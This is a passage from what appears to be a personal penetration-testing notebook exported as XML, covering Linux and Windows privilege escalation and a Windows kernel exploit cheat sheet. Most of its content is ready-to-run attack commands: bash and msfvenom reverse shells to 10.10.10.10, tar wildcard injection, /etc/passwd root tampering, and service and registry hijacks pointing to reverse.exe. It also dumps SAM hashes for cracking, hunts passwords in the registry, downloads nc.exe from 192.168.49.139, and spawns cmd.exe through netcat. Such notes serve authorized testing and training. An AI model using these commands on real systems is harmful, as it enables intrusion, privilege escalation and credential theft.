          <codebox char_offset="44" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">cat /etc/exports | grep root
showmount -e &lt;victimip&gt;</codebox>
          <codebox char_offset="69" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">openssl passwd newpasswordhere
root:x:.......  -&gt; change x to pass
OR - copy the line and change the root username and then su to the new root
su eli</codebox>
          <codebox char_offset="101" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">cat /etc/crontab
ls -l /usr/local/bin/overwrite.sh
change to:
	#!/bin/bash
	bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</codebox>
          <codebox char_offset="126" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf</codebox>
        </node>
      </node>
      <node name="Windows" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129771" ts_lastsave="1652982596">
        <node name="Initial Enumeration" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131244" ts_lastsave="1652719210">
          <rich_text scale="h1">System Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">User Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Network Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Password Hunting</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Service Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>	

</rich_text>
          <rich_text scale="h1">AV Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Alternate Data Streams (Windows hidden files)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="19" justification="left" frame_width="500" frame_height="70" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">systeminfo
hostname
wmic qfe &lt;# checks for recent patches #&gt;
wmic logicaldisk get caption,description,providername &lt;# list drives #&gt;
tasklist &lt;# check running processes and PID #&gt;
schtask &lt;#check tasks, may require admin#&gt;
ps &lt;#in powershell&gt;</codebox>
          <codebox char_offset="39" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">whoami &lt;# user info #&gt;
whoami /priv &lt;# privilege info #&gt;
whoami /groups &lt;# group info #&gt;
net user &lt;# shows all users #&gt;
net user *user* &lt;# shows user info for targeted user #&gt;
net localgroup administrators &lt;# shows administrator group info #&gt;
icacls file &lt;#use to check perm on executable#&gt;</codebox>
          <codebox char_offset="62" justification="left" frame_width="500" frame_height="70" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">ipconfig /all &lt;# network info #&gt;
arp -a &lt;# checks arp tables #&gt;
route print &lt;# shows what devices are being commed with #&gt;
netstat -ano &lt;# shows ports; very helpful #&gt;</codebox>
          <codebox char_offset="82" justification="left" frame_width="320" frame_height="40" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">findstr /si password *.txt *.ini *.config *.xml
#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
#Common Password Files, look for BASE64
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
# In Registry
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s</codebox>
          <codebox char_offset="105" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">sc qc &lt;service&gt;</codebox>
          <codebox char_offset="124" justification="left" frame_width="215" frame_height="55" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">sc query windefend
sc queryex type= service
netsh firewall show state</codebox>
          <codebox char_offset="173" justification="left" frame_width="485" frame_height="55" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#Finding
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
gci -force
#Reading
Get-Content -path c:\Users\example\example --stream example</codebox>
        </node>
        <node name="Local Exploitation" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652719035" ts_lastsave="1653182214">
          <rich_text scale="h2">Insecure Service Permissions</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Unquoted Service Path</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Weak Registry Permissions</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Always Install Elevated</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">SAM Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Scheduled Tasks</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Bypass Upload Access Denied</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">RunAs (Sudo for windows)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Token Impersonation</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="29" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">accesschk.exe /accepteula -uwcqv &lt;user&gt; &lt;service&gt;
sc qc &lt;service&gt;
sc config &lt;service&gt; binpath= "\"C:\Path\To\revshell.exe\""
net start &lt;service&gt;</codebox>
          <codebox char_offset="54" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">sc qc &lt;service&gt;
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe" (Common Files folder)
net start &lt;service&gt;</codebox>
          <codebox char_offset="83" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">sc qc &lt;service&gt;
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\&lt;service&gt;
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f</codebox>
          <codebox char_offset="110" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</codebox>
          <codebox char_offset="123" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">copy C:\WINDOWS\Repair\SAM \\&lt;IP&gt;\&lt;SHARE&gt;
copy C:\WINDOWS\Repair\SYSTEM \\&lt;IP&gt;\&lt;SHARE&gt;
pwdump.py SYSTEM SAM 
hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists</codebox>
          <codebox char_offset="142" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</codebox>
          <codebox char_offset="173" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">powershell.exe -c "iwr http://192.168.49.139/nc.exe -OutFile C:\temp\nc.exe"</codebox>
          <codebox char_offset="201" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">runas /env /profile /user:&lt;DOMAIN/PC&gt;\Administrator "C:\temp\nc.exe -e cmd.exe </codebox>
          <codebox char_offset="224" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1"></codebox>
        </node>
        <node name="Kernel Exploits" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131258" ts_lastsave="1655753208">
          <rich_text>• </rich_text>
          <rich_text scale="h1">Kernel Exploit Cheat Sheet</rich_text>
          <rich_text>
• Note: I've tried to find pre-compiled, you may have to compile on target machine.
• 
• </rich_text>
          <rich_text scale="h2">MS09-012   “Churrasco” or "Chimichurri"</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Microsoft Windows 2000 Service Pack 4
Windows XP Service Pack 2 and Windows XP Service Pack 3
Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2
Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Titanium-based Systems
Windows Vista and Windows Vista Service Pack 1
Windows Vista x64 Edition and Windows Vista x64 Edition Service Pack 1
Windows Server 2008 for 32-bit Systems
Windows Server 2008 for x64-based Systems
Windows Server 2008 for Itanium-based Systems

• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/Re4son/Churrasco/">https://github.com/Re4son/Churrasco/</rich_text>
          <rich_text>
   • churrasco.exe
      I usually drop it on a box via smb copy
• 
• </rich_text>
          <rich_text scale="h2">MS10_015   “KiTrap0D”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected version</rich_text>
          <rich_text>
Windows Server 2003, Windows Server 2008, 7, XP
Windows 2000 Service Pack 4
Windows XP Service Pack 2 and Windows XP Service Pack 3
Windows XP Professional x64 Edition Service Pack 2
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
Windows Vista、Windows Vista Service Pack 1 and Windows Vista Service Pack 2
Windows Vista x64 Edition、Windows Vista x64 Edition Service Pack 1 and Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems and Windows Server 2008 for 32-bit Systems Service Pack 2*
Windows Server 2008 for x64-based Systems and Windows Server 2008 for x64-based Systems Service Pack 2*
Windows Server 2008 for Itanium-based Systems and Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
I haven't been able to find an exploit that will elevate the current shell, they all seem to spawn a new shell. If you know of one let me know!
</rich_text>
          <rich_text link="webs https://github.com/am0nsec/exploit/tree/master/windows/privs/MS10-015-KiTrap0D">https://github.com/am0nsec/exploit/tree/master/windows/privs/MS10-015-KiTrap0D</rich_text>
          <rich_text>
   • vdmallowed.exe
   • vdmexploit.dll
</rich_text>
          <rich_text link="webs https://github.com/Re4son/KiTrapOD">https://github.com/Re4son/KiTrapOD</rich_text>
          <rich_text>
   • vdmallowed.exe
   • vdmexploit.dll
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/11199">https://www.exploit-db.com/exploits/11199</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS10-059   “Churraskito”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 1 and Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 1 and Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems and Windows Server 2008 for 32-bit Systems Service Pack 2*
Windows Server 2008 for x64-based Systems and Windows Server 2008 for x64-based Systems Service Pack 2*
Windows Server 2008 for Itanium-based Systems and Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems
Windows 7 for x64-based Systems
Windows Server 2008 R2 for x64-based Systems*
Windows Server 2008 R2 for Itanium-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059</rich_text>
          <rich_text>
   • Download zip
• 
• </rich_text>
          <rich_text scale="h2">MS10-092   Schelevator</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 1 and Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 1 and Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems and Windows Server 2008 for 32-bit Systems Service Pack 2*
Windows Server 2008 for x64-based Systems and Windows Server 2008 for x64-based Systems Service Pack 2*
Windows Server 2008 for Itanium-based Systems and Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems
Windows 7 for x64-based Systems
Windows Server 2008 R2 for x64-based Systems*
Windows Server 2008 R2 for Itanium-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/15589">https://www.exploit-db.com/exploits/15589</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS11-046   “afd.sys”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows XP SP3 x86
Windows XP Pro SP2 x64
Windows Server 2003 SP2 x86
Windows Server 2003 SP2 x64
Windows Server 2003 SP2 Itanium-based Systems 
Windows Vista SP1 x86
Windows Vista SP2 x86
Windows Vista SP1 x64
Windows Vista SP2 x64
Windows Server 2008 x86
Windows Server 2008 SP2 x86
Windows Server 2008 x64
Windows Server 2008 SP2 x64
Windows Server 2008 Itanium-based Systems
Windows Server 2008 SP2 Itanium-based Systems
Windows 7 x86
Windows 7 SP1 x86
Windows 7 x64
Windows 7 SP1 x64
Windows Server 2008 R2 x64
Windows Server 2008 R2 SP1 x64
Windows Server 2008 R2 Itanium-based Systems
Windows Server 2008 R2 SP1 Itanium-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS11-062   “NDISTAPI”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows XP SP3 x86
Windows XP Pro SP2 x64
Windows Server 2003 SP2 x86
Windows Server 2003 SP2 x64
Windows Server 2003 SP2 Itanium-based Systems 
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/40627">https://www.exploit-db.com/exploits/40627</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS11-080   “AfdJoinLeaf”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows XP Service Pack 3
Windows XP Professional x64 Edition Service Pack 2
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/18176">https://www.exploit-db.com/exploits/18176</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS14-002   “NDPROXY”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows XP Service Pack 3
Windows XP Professional x64 Edition Service Pack 2
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/37732">https://www.exploit-db.com/exploits/37732</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/30014">https://www.exploit-db.com/exploits/30014</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/dev-zzo/exploits-nt-privesc/blob/master/MS14-002/MS14-002.c">https://github.com/dev-zzo/exploits-nt-privesc/blob/master/MS14-002/MS14-002.c</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS14-040   “Dangling Pointer” </rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8 for 32-bit Systems
Windows 8 for x64-based Systems
Windows 8.1 for 32-bit Systems
Windows 8.1 for 32-bit Systems[2] (2973408)
Windows 8.1 for x64-based Systems
Windows Server 2012
[Windows Server 2012 R2
Windows RT[3] (2961072)
Windows RT 8.1[1][3] (2961072)
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploits</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/39446">https://www.exploit-db.com/exploits/39446</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/JeremyFetiveau/Exploits/blob/master/MS14-040.cpp">https://github.com/JeremyFetiveau/Exploits/blob/master/MS14-040.cpp</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS14_058   “win32k.sys”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8 for 32-bit Systems
Windows 8 for x64-based Systems
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows RT[1] (3000061)
Windows RT 8.1[1] (3000061)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 R2 for x64-based Systems Service Pack 1
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploits</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/sam-b/CVE-2014-4113">https://github.com/sam-b/CVE-2014-4113</rich_text>
          <rich_text>
• 
• 
• </rich_text>
          <rich_text scale="h2">MS14_070   “TCP/IP IOCTL”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based System
• 
• </rich_text>
          <rich_text scale="h2">MS15-051   “ClientCopyImage”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Server 2003 Service Pack 2
Windows Server 2003 x64 Edition Service Pack 2
Windows Server 2003 with SP2 for Itanium-based Systems
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8 for 32-bit Systems
Windows 8 for x64-based Systems
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows RT[1] (3045171)
Windows RT 8.1[1] (3045171)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 R2 for x64-based Systems Service Pack 1
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou32.exe">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou32.exe</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS16-014   “wmi recv notif”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows RT 8.1[1] (3126587)
Windows RT 8.1[1] (3126593)
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1511 for 32-bit Systems
Windows 10 Version 1511 for x64-based Systems
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 R2 for x64-based Systems Service Pack 1
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploits</rich_text>
          <rich_text>

• 
• </rich_text>
          <rich_text scale="h2">MS16-016   “mrxdav.sys”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploits</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/koczkatamas/CVE-2016-0051">https://github.com/koczkatamas/CVE-2016-0051</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS16-032   “secondary logon”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows RT 8.1 [1] (3139914)
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1511 for 32-bit Systems
Windows 10 Version 1511 for x64-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/khr0x40sh/ms16-032">https://github.com/khr0x40sh/ms16-032</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">MS16-098   “RGNOBJ”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows RT 8.1[1] （3177725）
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1511 for 32-bit Systems
Windows 10 Version 1511 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 Version 1607 for x64-based Systems
• 
• </rich_text>
          <rich_text scale="h2">MS16-135   “NtSetWindowLongPtr”</rich_text>
          <rich_text>
• </rich_text>
          <rich_text scale="h3">affected versions</rich_text>
          <rich_text>
Windows Vista Service Pack 2
Windows Vista x64 Edition Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for Itanium-based Systems Service Pack 2
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Windows 8.1 for 32-bit Systems
Windows 8.1 for x64-based Systems
Windows Server 2012
Windows Server 2012 R2
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1511 for 32-bit Systems
Windows 10 Version 1511 for x64-based Systems
Windows Server 2016 for x64-based Systems
• 
• </rich_text>
          <rich_text scale="h3">Reliable Exploit</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/FSecureLABS/CVE-2016-7255">https://github.com/FSecureLABS/CVE-2016-7255</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1">https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1</rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
• 
• </rich_text>
          <rich_text scale="h2">SecWiki</rich_text>
          <rich_text>
Wealthy resource, find kernel version here = win 85% of the time
</rich_text>
          <codebox char_offset="13474" justification="left" frame_width="350" frame_height="40" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn</codebox>
        </node>
      </node>
    </node>
  </node>
